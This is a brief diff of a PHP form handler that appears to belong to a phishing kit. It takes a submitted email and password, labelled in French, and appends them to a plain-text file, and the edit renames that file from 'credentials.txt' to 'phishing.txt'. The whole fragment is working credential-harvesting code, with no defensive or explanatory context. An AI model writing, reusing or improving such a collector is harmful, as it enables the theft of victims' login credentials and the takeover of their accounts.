@@ -5,7 +5,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     
     $data = "Email: " . $email . " | Mot de passe: " . $password . "\n";
 
-    file_put_contents("credentials.txt", $data, FILE_APPEND);
+    file_put_contents("phishing.txt", $data, FILE_APPEND);
 
     echo "success";
 }
